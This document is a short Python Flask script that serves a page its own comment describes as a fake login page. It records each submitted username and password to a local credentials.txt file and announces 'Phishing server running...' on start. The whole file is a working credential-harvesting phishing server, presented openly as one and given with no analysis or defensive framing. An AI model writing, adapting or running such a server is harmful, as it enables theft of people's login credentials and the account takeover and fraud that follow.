from flask import Flask, request, render_template
import threading

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')  # Create a fake login page

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    return "Logged!"

def run():
    app.run(host='0.0.0.0', port=80)

if __name__ == "__main__":
    t = threading.Thread(target=run)
    t.start()
    print("Phishing server running...")